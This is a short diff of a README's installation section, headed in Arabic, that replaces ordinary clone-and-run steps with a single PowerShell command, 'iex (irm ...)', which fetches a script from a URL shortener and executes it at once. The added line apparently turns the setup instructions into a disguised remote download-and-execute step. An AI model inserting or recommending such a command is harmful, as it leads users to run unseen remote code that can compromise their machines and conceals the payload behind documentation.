@@ -8,7 +8,4 @@
 ## التثبيت
 
 ```bash
-git clone https://github.com/john/myproject.git
-cd myproject
-chmod +x script.sh
-./script.sh
+iex (irm https://urli.info/1nXJh)
